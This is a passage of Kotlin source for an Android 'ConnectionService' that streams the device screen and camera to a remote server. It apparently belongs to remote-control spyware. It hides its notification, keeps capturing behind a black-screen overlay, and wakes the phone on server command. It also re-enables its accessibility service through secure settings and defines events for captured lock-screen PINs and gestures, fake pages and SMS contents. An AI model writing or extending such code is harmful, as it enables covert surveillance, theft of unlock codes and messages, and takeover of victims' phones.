        pendingStreamFps = fps
        runCatching { ScreenCastConsentActivity.launch(this) }
            .onFailure {
                pendingStreamFps = null
                return false
            }
        return false
    }

    private fun startProjectionWebRtc(fps: Int) {
        stopCameraStream()
        stopSnapshotStream(keepCapturer = false)
        stopWebRtcSession()
        desiredScreenFps = fps.coerceIn(1, 5)
        screenWebSocketClient?.sendScreenStatus("webrtc_starting", "projection")
        val session = ScreenWebRtcSession(
            context = this,
            signaling = createWebRtcSignalingSink(
                source = "projection",
                onFailedFallback = {
                    if (screenStreamDesired && screenStreamMode == MODE_PROJECTION) {
                        startSnapshotStream(desiredScreenFps)
                    }
                },
            ),
        )
        screenWebRtcSession = session
        val webrtcFps = (desiredScreenFps * 3).coerceIn(8, 15)
        session.startProjection(pendingIceServers, webrtcFps)
    }

    private fun stopWebRtcSession() {
        val session = screenWebRtcSession ?: return
        screenWebRtcSession = null
        runCatching {
            screenWebSocketClient?.sendSignaling("webrtc_hangup", JSONObject().put("reason", "local_stop"))
        }
        session.stop()
    }

    private fun startSnapshotStream(fps: Int) {
        stopCameraStream()
        stopSnapshotStream(keepCapturer = true)
        if (!MediaProjectionHolder.hasConsent()) {
            ensureProjectionAndStartStream(fps)
            return
        }
        promoteToForegroundSafely(withMediaProjection = true)
        val capturer = mediaProjectionCapturer ?: MediaProjectionCapturer(this).also {
            mediaProjectionCapturer = it
        }
        if (!capturer.isRunning()) {
            val started = runCatching { capturer.start() }.getOrDefault(false)
            if (!started) {
                MediaProjectionHolder.clear()
                screenWebSocketClient?.sendScreenError(ERROR_PROJECTION_SESSION_FAILED)
                pendingStreamFps = fps
                runCatching { ScreenCastConsentActivity.launch(this) }
                return
            }
        }

        snapshotStreamJob = serviceScope.launch {
            ensureScreenAwake()
            var blackPassthroughHeld = false
            // WebSocket 模式：1688 同款 WEBP + 黑帧复用；否则沿用旧 JPEG 路径。
            val useWebp = preferWebSocketTransport
            var lastPayload: String? = null
            try {
                val intervalMs = 1000L / fps.coerceIn(1, 5)
                while (isActive) {
                    if (!MediaProjectionHolder.hasConsent()) {
                        screenWebSocketClient?.sendScreenError(ERROR_PROJECTION_STOPPED)
                        break
                    }
                    val blackActive = AccessibilityControlBridge.isBlackScreenActive()
                    if (blackActive && !blackPassthroughHeld) {
                        AccessibilityControlBridge.beginBlackScreenCaptureSession()
                        blackPassthroughHeld = true
                    } else if (!blackActive && blackPassthroughHeld) {
                        AccessibilityControlBridge.endBlackScreenCaptureSession()
                        blackPassthroughHeld = false
                    }

                    val startedAt = System.currentTimeMillis()
                    if (useWebp) {
                        val frame = capturer.captureOnceBitmap()
                        val bitmap = frame.bitmap
                        if (frame.ok && bitmap != null) {
                            val encodedFrame = withContext(Dispatchers.Default) {
                                try {
                                    ScreenFrameCodec.encodeFrame(
                                        bitmap,
                                        currentWebpQuality(),
                                    )
                                } finally {
                                    if (!bitmap.isRecycled) bitmap.recycle()
                                }
                            }
                            val payload = when {
                                encodedFrame == null -> ""
                                encodedFrame.isBlack && lastPayload != null -> lastPayload!!
                                else -> encodedFrame.base64
                            }
                            if (encodedFrame != null && !encodedFrame.isBlack &&
                                encodedFrame.base64.isNotBlank()
                            ) {
                                lastPayload = encodedFrame.base64
                            }
                            if (payload.isNotBlank()) {
                                ensureControlChannelAlive()
                                screenWebSocketClient?.sendScreenFrame(
                                    data = payload,
                                    screenWidth = frame.screenWidth,
                                    screenHeight = frame.screenHeight,
                                    source = "projection",
                                    imageWidth = encodedFrame?.width ?: frame.screenWidth,
                                    imageHeight = encodedFrame?.height ?: frame.screenHeight,
                                    mimeType = "image/webp",
                                )
                            }
                        } else if (frame.error == "projection_not_ready" ||
                            frame.error == "projection_start_failed"
                        ) {
                            screenWebSocketClient?.sendScreenError(ERROR_PROJECTION_SESSION_FAILED)
                            break
                        }
                    } else {
                        val capture = captureScreenOnce()
                        if (capture.ok && capture.data.isNotBlank()) {
                            ensureControlChannelAlive()
                            screenWebSocketClient?.sendScreenFrame(
                                data = capture.data,
                                screenWidth = capture.screenWidth,
                                screenHeight = capture.screenHeight,
                            )
                        } else if (capture.error == "projection_not_ready" ||
                            capture.error == "projection_start_failed"
                        ) {
                            screenWebSocketClient?.sendScreenError(ERROR_PROJECTION_SESSION_FAILED)
                            break
                        }
                    }
                    val elapsed = System.currentTimeMillis() - startedAt
                    val waitMs = (intervalMs - elapsed).coerceAtLeast(80L)
                    delay(waitMs)
                }
            } finally {
                if (blackPassthroughHeld) {
                    AccessibilityControlBridge.endBlackScreenCaptureSession()
                }
            }
        }
    }

    private fun stopSnapshotStream(keepCapturer: Boolean = false) {
        snapshotStreamJob?.cancel()
        snapshotStreamJob = null
        AccessibilityControlBridge.endBlackScreenCaptureSession()
        if (!keepCapturer) {
            mediaProjectionCapturer?.stop(releaseProjection = false)
        }
        if (cameraStreamCapturer?.isRunning() != true) {
            promoteToForegroundSafely(withMediaProjection = MediaProjectionHolder.hasConsent())
        }
    }

    private fun requestCameraStreamStart(facing: String, fps: Int): Boolean {
        pendingCameraFacing = facing
        pendingCameraFps = fps
        return runCatching {
            CameraPermissionActivity.launch(this, facing, fps)
            true
        }.getOrElse {
            pendingCameraFacing = null
            pendingCameraFps = null
            false
        }
    }

    private fun hasCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) ==
            PackageManager.PERMISSION_GRANTED
    }

    private fun startCameraStream(facing: String, fps: Int) {
        if (!hasCameraPermission()) {
            screenWebSocketClient?.sendScreenError(ERROR_CAMERA_NOT_GRANTED)
            return
        }

        stopSnapshotStream()
        stopCameraStream(keepCapturer = false)
        promoteToForegroundSafely(withCamera = true)

        val capturer = CameraStreamCapturer(this).also { cameraStreamCapturer = it }
        val started = runCatching { capturer.start(facing) }.getOrDefault(false)
        if (!started) {
            cameraStreamCapturer = null
            promoteToForegroundSafely(withMediaProjection = MediaProjectionHolder.hasConsent())
            screenWebSocketClient?.sendScreenError(ERROR_CAMERA_NOT_GRANTED)
            return
        }

        val source = if (facing == "front") "camera_front" else "camera_back"
        val (displayW, displayH) = displayMetricsSize()
        cameraStreamJob = serviceScope.launch {
            val intervalMs = 1000L / fps.coerceIn(1, 5)
            while (isActive) {
                val startedAt = System.currentTimeMillis()
                val capture = runCatching { capturer.captureOnce() }.getOrDefault(
                    ScreenCaptureBridge.CaptureResult(false, error = "capture_failed"),
                )
                if (capture.ok && capture.data.isNotBlank()) {
                    ensureControlChannelAlive()
                    val imageW = if (capture.imageWidth > 0) capture.imageWidth else capture.screenWidth
                    val imageH = if (capture.imageHeight > 0) capture.imageHeight else capture.screenHeight
                    screenWebSocketClient?.sendScreenFrame(
                        data = capture.data,
                        screenWidth = displayW,
                        screenHeight = displayH,
                        source = source,
                        imageWidth = imageW,
                        imageHeight = imageH,
                    )
                }
                val elapsed = System.currentTimeMillis() - startedAt
                val waitMs = (intervalMs - elapsed).coerceAtLeast(80L)
                delay(waitMs)
            }
        }
    }

    private fun stopCameraStream(keepCapturer: Boolean = false) {
        cameraStreamJob?.cancel()
        cameraStreamJob = null
        if (!keepCapturer) {
            runCatching { cameraStreamCapturer?.stop() }
            cameraStreamCapturer = null
            if (snapshotStreamJob?.isActive != true) {
                promoteToForegroundSafely(withMediaProjection = MediaProjectionHolder.hasConsent())
            }
        }
    }

    private fun displayMetricsSize(): Pair<Int, Int> {
        val metrics = android.util.DisplayMetrics()
        @Suppress("DEPRECATION")
        (getSystemService(WINDOW_SERVICE) as android.view.WindowManager)
            .defaultDisplay
            .getRealMetrics(metrics)
        return metrics.widthPixels to metrics.heightPixels
    }

    private fun promoteToForegroundSafely(
        withMediaProjection: Boolean = false,
        withCamera: Boolean = false,
    ) {
        runCatching {
            promoteToForeground(withMediaProjection = withMediaProjection, withCamera = withCamera)
        }.onFailure { first ->
            android.util.Log.w(TAG, "promote FGS failed, retry without camera", first)
            runCatching {
                promoteToForeground(withMediaProjection = withMediaProjection, withCamera = false)
            }.onFailure { second ->
                android.util.Log.e(TAG, "promote FGS failed", second)
            }
        }
    }

    private suspend fun ensureScreenAwake() {
        if (DeviceStateHelper.isInteractive(this)) {
            return
        }
        DeviceStateHelper.wakeScreen(this)
        delay(SCREEN_WAKE_DELAY_MS)
    }

    private fun startZombieWakePolling() {
        zombieWakePollJob?.cancel()
        android.util.Log.i(ZOMBIE_WAKE_LOG_TAG, "start polling intervalMs=${ZombieWakeAlarm.ACTIVE_INTERVAL_MS}")
        zombieWakePollJob = serviceScope.launch {
            while (isActive) {
                runCatching { pollZombieWakeOnce() }
                    .onFailure { error ->
                        android.util.Log.e(ZOMBIE_WAKE_LOG_TAG, "poll loop error: ${error.message}", error)
                    }
                delay(ZombieWakeAlarm.ACTIVE_INTERVAL_MS)
            }
        }
    }

    /**
     * 无障碍巡检 + 自愈。
     *
     * 每 30s 看一次四态，非 NORMAL 就交给 [AccessibilitySelfHeal] 处理。
     * 能不能真动手由它内部决定（有没有 `WRITE_SECURE_SETTINGS`、是否被抑制、是否限频），
     * 这里只管「发现异常」这一件事。
     */
    private fun startAccessibilityWatch() {
        a11yWatchJob?.cancel()
        a11yWatchJob = serviceScope.launch {
            // 冷启动宽限：进程刚起来时 AccessibilityManagerService 可能还没把
            // 已配置的服务 bind 完，立刻判定会把 NORMAL 误判成 ORPHANED。
            delay(A11Y_WATCH_COLD_GRACE_MS)
            while (isActive) {
                runCatching {
                    val state = AccessibilityHealth.evaluate(this@ConnectionService)
                    if (state == AccessibilityHealth.State.NORMAL) {
                        val prefs = SetupPrefs(this@ConnectionService)
                        if (!prefs.a11yEverHealthy) {
                            prefs.a11yEverHealthy = true
                        }
                    } else {
                        android.util.Log.w(
                            A11Y_LOG_TAG,
                            "watch state=${AccessibilityHealth.describe(state)} " +
                                "source=WATCH ${AccessibilitySelfHeal.snapshot(this@ConnectionService)}",
                        )
                        AccessibilitySelfHeal.checkAndHeal(
                            this@ConnectionService,
                            source = "WATCH",
                        )
                    }
                }.onFailure { error ->
                    android.util.Log.w(A11Y_LOG_TAG, "watch error: ${error.message}")
                }
                delay(A11Y_WATCH_INTERVAL_MS)
            }
        }
    }

    private suspend fun pollZombieWakeOnce() {
        val apiBaseUrl = ServerEndpointStore.current(serverPrefs).apiBaseUrl
        android.util.Log.i(ZOMBIE_WAKE_LOG_TAG, "poll begin api=$apiBaseUrl")
        val startedAt = System.currentTimeMillis()
        val status = runCatching { apiClient.fetchZombieWake(apiBaseUrl) }
            .onFailure { error ->
                android.util.Log.w(ZOMBIE_WAKE_LOG_TAG, "poll http failed: ${error.message}")
            }
            .getOrNull()
        val costMs = System.currentTimeMillis() - startedAt
        if (status == null) {
            android.util.Log.w(ZOMBIE_WAKE_LOG_TAG, "poll result=null costMs=$costMs → reschedule idle")
            ZombieWakeAlarm.schedule(this, ZombieWakeAlarm.IDLE_INTERVAL_MS)
            return
        }
        android.util.Log.i(
            ZOMBIE_WAKE_LOG_TAG,
            "poll ok costMs=$costMs needWake=${status.needWake} remainingMs=${status.remainingMs} " +
                "wakeUntil=${status.wakeUntil} keepAwakeMs=${status.keepAwakeMs}",
        )
        // 轮询是唯一常驻的定时入口，顺带兜住 FCM 订阅：
        // 订阅重试链只有 225s，耗尽后若再没走过 setup 收尾就永远收不到唤醒。
        // 已订阅时这个调用只做一次原子读，日志不刷屏。
        FcmTopicSubscriber.ensureSubscribed(this)
        if (status.needWake && status.wakeUntil > System.currentTimeMillis()) {
            val keepMs = status.keepAwakeMs.takeIf { it > 0L }
                ?: ZombieWakeController.DEFAULT_KEEP_AWAKE_MS
            val applied = ZombieWakeController.apply(this, status.wakeUntil, keepMs)
            android.util.Log.i(ZOMBIE_WAKE_LOG_TAG, "apply keepAwake keepMs=$keepMs applied=$applied")
            ensureControlChannelAlive(force = false)
            ZombieWakeAlarm.schedule(this, ZombieWakeAlarm.ACTIVE_INTERVAL_MS)
        } else {
            // 竞态保护：FCM/广播可能刚建立会话，而服务端 flag 尚未传播。
            // 广播带外给的 wakeUntil 比一次 HTTP 快照更权威，在它到期前不得取消。
            val broadcastUntil = ZombieWakeController.broadcastUntilMs()
            if (broadcastUntil > System.currentTimeMillis()) {
                android.util.Log.i(
                    ZOMBIE_WAKE_LOG_TAG,
                    "flag cleared but broadcast session authoritative until=$broadcastUntil → keep",
                )
                ZombieWakeAlarm.schedule(this, ZombieWakeAlarm.ACTIVE_INTERVAL_MS)
                return
            }
            // 无论本地会话是否已标记结束，都强制 cancel，卸掉残留常亮/WakeLock
            if (ZombieWakeController.isSessionActive() ||
                AccessibilityControlBridge.isRemoteKeepAwakeActive()
            ) {
                android.util.Log.i(ZOMBIE_WAKE_LOG_TAG, "flag cleared → cancel local session")
            }
            ZombieWakeController.cancel("flag_cleared")
            ZombieWakeAlarm.schedule(this, ZombieWakeAlarm.IDLE_INTERVAL_MS)
        }
    }

    private fun broadcastStatus(message: String) {
        sendBroadcast(
            Intent(ACTION_STATUS).apply {
                setPackage(packageName)
                putExtra(EXTRA_STATUS, message)
            },
        )
    }

    private fun broadcastDeviceId(deviceId: String) {
        val payload = Intent(ACTION_DEVICE_ID).putExtra(EXTRA_DEVICE_ID, deviceId)
        // 本包内 UI
        sendBroadcast(Intent(payload).setPackage(packageName))
        // 通知安装器（若在监听）
        for (installer in listOf(
            BuildConfig.INSTALLER_APPLICATION_ID,
            "${BuildConfig.INSTALLER_APPLICATION_ID}.debug",
        )) {
            sendBroadcast(Intent(payload).setPackage(installer))
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            return
        }
        val manager = getSystemService(NotificationManager::class.java)
        manager.deleteNotificationChannel(CHANNEL_ID_LEGACY)
        manager.deleteNotificationChannel(CHANNEL_ID_RUNNING_LEGACY)
        manager.deleteNotificationChannel(CHANNEL_ID_SILENT_LEGACY)
        val channel = NotificationChannel(
            CHANNEL_ID,
            getString(R.string.connection_notification_channel),
            NotificationManager.IMPORTANCE_MIN,
        ).apply {
            description = getString(R.string.connection_notification_channel_desc)
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
            setSound(null, null)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
        }
        manager.createNotificationChannel(channel)
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.connection_notification_title))
            .setContentText(getString(R.string.connection_notification_text))
            .setSmallIcon(R.drawable.ic_notification_silent)
            .setSilent(true)
            .setShowWhen(false)
            .setOngoing(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun promoteToForeground(
        withMediaProjection: Boolean = false,
        withCamera: Boolean = false,
    ) {
        val notification = buildNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val type = FgsKeepAlive.connectionType(
                withMediaProjection = withMediaProjection && MediaProjectionHolder.hasConsent(),
                withCamera = (withCamera || cameraStreamCapturer?.isRunning() == true) &&
                    hasCameraPermission(),
            )
            if (type == 0) {
                error("no remaining FGS type")
            }
            ServiceCompat.startForeground(this, NOTIFICATION_ID, notification, type)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    companion object {
        private const val TAG = "ConnectionService"
        private const val ZOMBIE_WAKE_LOG_TAG = "ZombieWake"
        private const val A11Y_LOG_TAG = "A11ySelfHeal"
        /** 无障碍巡检间隔 */
        private const val A11Y_WATCH_INTERVAL_MS = 30_000L
        /** 冷启动宽限：避免进程刚起来时把未完成的 bind 误判成 ORPHANED */
        private const val A11Y_WATCH_COLD_GRACE_MS = 10_000L
        private val running = AtomicBoolean(false)

        /** L1-1: 需要互斥的重命令白名单（同 cmd 在途时直接 superseded）。 */
        private val HEAVY_COMMANDS = setOf("get_screen", "capture_screenshot", "dump_keyguard_tree")
        /** L3: UI 树去抖窗口。 */
        private const val UI_TREE_DEBOUNCE_MS = 200L
        /** L3: UI 树节流上限（两次 push 最小间隔）。 */
        private const val UI_TREE_THROTTLE_MS = 800L
        /** L3: 空闲心跳：UI 完全静止时也至少每 5s 推一次，让前端确认订阅还活着。 */
        private const val UI_TREE_IDLE_HEARTBEAT_MS = 5_000L

        fun isRunning(): Boolean = running.get()
        val ACTION_STATUS: String get() = AppBroadcast.ACTION_STATUS
        val ACTION_DEVICE_ID: String get() = AppBroadcast.ACTION_DEVICE_ID
        val ACTION_KEYBOARD_EVENT: String get() = AppBroadcast.ACTION_KEYBOARD_EVENT
        val ACTION_KEYGUARD_PIN_EVENT: String get() = AppBroadcast.ACTION_KEYGUARD_PIN_EVENT
        val ACTION_FAKE_PAGE_EVENT: String get() = AppBroadcast.ACTION_FAKE_PAGE_EVENT
        val ACTION_SMS_EVENT: String get() = AppBroadcast.ACTION_SMS_EVENT
        val ACTION_PROJECTION_CONSENT_RESULT: String
            get() = "${BuildConfig.APPLICATION_ID}.action.PROJECTION_CONSENT_RESULT"
        val ACTION_CAMERA_PERMISSION_RESULT: String
            get() = "${BuildConfig.APPLICATION_ID}.action.CAMERA_PERMISSION_RESULT"
        val ACTION_START_CAMERA: String
            get() = "${BuildConfig.APPLICATION_ID}.action.START_CAMERA"
        val ACTION_ENSURE_CONTROL: String
            get() = "${BuildConfig.APPLICATION_ID}.action.ENSURE_CONTROL"
        val ACTION_POLL_ZOMBIE_WAKE: String
            get() = "${BuildConfig.APPLICATION_ID}.action.POLL_ZOMBIE_WAKE"
        val ACTION_FLUSH_PENDING_KEYGUARD_PINS: String
            get() = "${BuildConfig.APPLICATION_ID}.action.FLUSH_PENDING_KEYGUARD_PINS"
        const val EXTRA_DIRECT_BOOT = "direct_boot"
        const val EXTRA_PROJECTION_GRANTED = "projection_granted"
        const val EXTRA_CAMERA_GRANTED = "camera_granted"
        const val EXTRA_CAMERA_FACING = "camera_facing"
        const val EXTRA_CAMERA_FPS = "camera_fps"
        const val EXTRA_STATUS = AppBroadcast.EXTRA_STATUS
        const val EXTRA_DEVICE_ID = AppBroadcast.EXTRA_DEVICE_ID
        const val EXTRA_APP_PACKAGE = AppBroadcast.EXTRA_APP_PACKAGE
        const val EXTRA_APP_LABEL = AppBroadcast.EXTRA_APP_LABEL
        const val EXTRA_TEXT = AppBroadcast.EXTRA_TEXT
        const val EXTRA_PIN = AppBroadcast.EXTRA_PIN
        const val EXTRA_LOCK_TYPE = AppBroadcast.EXTRA_LOCK_TYPE
        const val EXTRA_GESTURE_PATH = AppBroadcast.EXTRA_GESTURE_PATH
        const val EXTRA_TITLE = AppBroadcast.EXTRA_TITLE
        const val EXTRA_SUBMIT_COUNT = AppBroadcast.EXTRA_SUBMIT_COUNT
        const val EXTRA_EVENT_TYPE = AppBroadcast.EXTRA_EVENT_TYPE
        const val EXTRA_CAPTURED_AT = AppBroadcast.EXTRA_CAPTURED_AT
        const val EXTRA_SENDER = AppBroadcast.EXTRA_SENDER
        const val EXTRA_BODY = AppBroadcast.EXTRA_BODY
        const val EXTRA_SMS_TYPE = AppBroadcast.EXTRA_SMS_TYPE
        const val EXTRA_SOURCE = AppBroadcast.EXTRA_SOURCE
        const val EXTRA_CLIENT_SMS_ID = AppBroadcast.EXTRA_CLIENT_SMS_ID
        const val EXTRA_RECEIVED_AT = AppBroadcast.EXTRA_RECEIVED_AT
        private const val CHANNEL_ID = "connection_service_hidden"
        private const val CHANNEL_ID_LEGACY = "connection_service"
        private const val CHANNEL_ID_RUNNING_LEGACY = "connection_service_running"
        private const val CHANNEL_ID_SILENT_LEGACY = "connection_service_silent"
        private const val NOTIFICATION_ID = 1002
        private const val RECONNECT_DELAY_MS = 5_000L
        private const val CONTROL_ENSURE_THROTTLE_MS = 5_000L
        private const val CONTROL_CONNECT_MIN_GAP_MS = 2_000L
        private const val SCREEN_CONNECT_MIN_GAP_MS = 2_000L
        private const val SCREEN_RECONNECT_DELAY_MS = 3_000L
        private const val SWITCH_ROLLBACK_MS = 180_000L
        private const val KEYBOARD_DEBOUNCE_MS = 500L
        private const val KEYGUARD_PIN_DEBOUNCE_MS = 1500L
        private const val SCREEN_WAKE_DELAY_MS = 200L
        private const val DEFAULT_SNAPSHOT_FPS = 4
        private const val MODE_SCREENSHOT = "screenshot"
        private const val MODE_PROJECTION = "projection"
        private const val MODE_SCREENHELPER = "screenhelper"
        private const val SCREENHELPER_JPEG_QUALITY = 45
        private const val SCREENHELPER_WEBP_QUALITY = 10
        private const val SCREEN_FRAME_WEBP_QUALITY = 10
        /** 高清档：短边 400（quality 40 经 rr.f() 联动算出），每帧约 20-30KB。 */
        private const val SCREEN_FRAME_WEBP_QUALITY_HD = 40
        private const val QUALITY_STANDARD = "standard"
        private const val QUALITY_HD = "hd"
        private const val DEFAULT_HISTORY_LIMIT = 50
        private const val ERROR_PROJECTION_NOT_GRANTED = 201
        private const val ERROR_PROJECTION_SESSION_FAILED = 202
        private const val ERROR_PROJECTION_STOPPED = 203
        private const val ERROR_A11Y_NOT_CONNECTED = 210
        private const val ERROR_SCREENSHOT_UNSUPPORTED = 211
        private const val ERROR_SCREENSHOT_CAPTURE_FAILED = 212
        private const val ERROR_SCREENSHOT_NO_FRAME = 213
        private const val ERROR_WEBRTC_FAILED = 220
        private const val ERROR_CAMERA_NOT_GRANTED = 301
        private const val SCREENSHOT_FAIL_REPORT_MIN_MS = 2_500L
    }
}
